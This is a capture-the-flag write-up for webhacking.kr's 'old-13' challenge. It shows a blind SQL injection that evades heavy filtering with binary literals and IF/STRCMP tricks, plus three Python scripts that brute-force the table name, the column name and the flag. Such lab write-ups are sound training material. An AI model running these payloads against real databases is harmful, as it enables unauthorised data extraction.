# Old 13    SQLi (Heavy Filters, No Table Name or No Column Name)

URL: [https://webhacking.kr/challenge/web-10/](https://webhacking.kr/challenge/web-10/)

![old-13-1.png](/assets/ctf/webhacking.kr/old-13-1.png)

After some experimenting with first form I found that it was highly restricted, like no spaces characters, most of keywords and logical operators were blocked, but `IF` worked. Also it only returns 1 if input is 1 and 0 on anything else.

![old-13.png](/assets/ctf/webhacking.kr/old-13.png)

This took so much function time.... First of all the column of flag wasn't known meaning it wasn't in table or we had to guess it... Since WHERE was blocked this became much harder. After going through many payloads on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-fast-exploitation) I found this *somewhat* neat payload. 
```sql
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```

Brute the tables... and btw no quotes were allows along with hex strings, but binary strings worked so that's good. One more thing about `STRCMP` function, the results are kinda reversed... Not exactly sure how to describe it, better to play around in MySQL.

```python
import string
import requests
from bs4 import BeautifulSoup as BS

URL = 'https://webhacking.kr/challenge/web-10/index.php'
COOKIES = {'PHPSESSID': 'hi4uvai5sde90encr0ktq6879f'}
CHARSET = '[" ],;' + string.ascii_letters + string.digits + '{}!?/_.'
PAYLOAD = 'IF(STRCMP(SUBSTR((SELECT(JSON_ARRAYAGG(CONCAT_WS(0b111011,IF((table_schema)IN(database()),table_name,NULL))))FROM(INFORMATION_SCHEMA.TABLES)),{},1),{}),1,0)'

flag = ''
with requests.Session() as session:
    session.cookies.update(COOKIES)
    while True:
        for char in CHARSET:
            flag_i = len(flag) + 1
            resp = session.get(f'{URL}?no={PAYLOAD.format(flag_i, bin(ord(char)))}')
            print(f'\r[{flag_i}] {flag} | {char}', end='')
            
            if flag == CHARSET[0] * 2: 
                exit(1) # Fail

            if BS(resp.text, 'html.parser').find('table').get_text() == 'result0':
                flag += char
                break
        else:
            break
    
    print(f'\r[{flag_i}] {flag} | {char}')
    
# [270] ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "flag_ab733768", "list"] | .
```

Now to get columns from the table. Essentially the query get's all tables that match the found table, concatenates, joins the output in single string, replaces empty matches and starts bruteforcing.
```python
import string
import asyncio
from aiohttp import ClientSession
from bs4 import BeautifulSoup as BS

URL = 'https://webhacking.kr/challenge/web-10/index.php'
COOKIES = {'PHPSESSID': 'hi4uvai5sde90encr0ktq6879f'}
CHARSET = '[" \x00],;' + string.ascii_letters + string.digits + '{}!?/_.' 
PAYLOAD = 'IF(STRCMP(SUBSTR((SELECT(REPLACE(JSON_ARRAYAGG(CONCAT_WS(0b111011,IF((table_name)IN(0b01100110011011000110000101100111010111110110000101100010001101110011001100110011001101110011011000111000),column_name,NULL))),0b00100010001000100010110000100000,0b00000000))FROM(INFORMATION_SCHEMA.COLUMNS)),{},1),{}),1,0)'
REPLACE_CHAR = '\x00'

async def fetch(session, index, char):
    async with session.get(f'{URL}?no={PAYLOAD.format(index, bin(ord(char)))}') as resp:
        text = await resp.text()
        if BS(text, 'html.parser').find('table').get_text() == 'result0':  
            return char

        return None

async def main():
    columns = '['
    async with ClientSession() as session:
        session.cookie_jar.update_cookies(COOKIES)
        while True:
            columns_i = len(columns) + 1
            print(f'\r[{columns_i}] {columns}', end='')

            if await fetch(session, columns_i, REPLACE_CHAR):
                columns += REPLACE_CHAR
                continue

            tasks = [fetch(session, columns_i, char) for char in CHARSET]
            results = await asyncio.gather(*tasks)
            if columns == CHARSET[0] * 2:
                exit(1)

            for result in results:
                if result:
                    columns += result
                    break
            else:
                break
  
        print(f'\r[{columns_i}] {columns}')

if __name__ == '__main__':
    asyncio.run(main())

# [628] ["flag_3a55b31d", ""]
```

Brute the flag:
```python
import string
import asyncio
from aiohttp import ClientSession
from bs4 import BeautifulSoup as BS

URL = 'https://webhacking.kr/challenge/web-10/index.php'
COOKIES = {'PHPSESSID': 'hi4uvai5sde90encr0ktq6879f'}
CHARSET = '[]", ' + string.ascii_letters + string.digits + '{}!?/_.' 
PAYLOAD = 'IF(STRCMP(SUBSTR((SELECT(JSON_ARRAYAGG(CONCAT_WS(0b111011,flag_3a55b31d)))FROM(flag_ab733768)),{},1),{}),1,0)'

async def fetch(session, index, char):
    async with session.get(f'{URL}?no={PAYLOAD.format(index, bin(ord(char)))}') as resp:
        text = await resp.text()
        if BS(text, 'html.parser').find('table').get_text() == 'result0':  
            return char

        return None

async def main():
    columns = '["flag", "FLAG{challenge13gummyclear}"'
    async with ClientSession() as session:
        session.cookie_jar.update_cookies(COOKIES)
        while True:
            columns_i = len(columns) + 1
            print(f'\r[{columns_i}] {columns}', end='')

            tasks = [fetch(session, columns_i, char) for char in CHARSET]
            results = await asyncio.gather(*tasks)
            if columns == CHARSET[0] * 2:
                exit(1)

            for result in results:
                if result:
                    columns += result
                    break
            else:
                break
  
        print(f'\r[{columns_i}] {columns}')

if __name__ == '__main__':
    asyncio.run(main())

# [40] ["flag", "FLAG{challenge13gummyclear}"]
```

> **Note**: If you're wondering why Im not using `params` in the get request it's because for some reason the webapp didn't like urlencoded params?..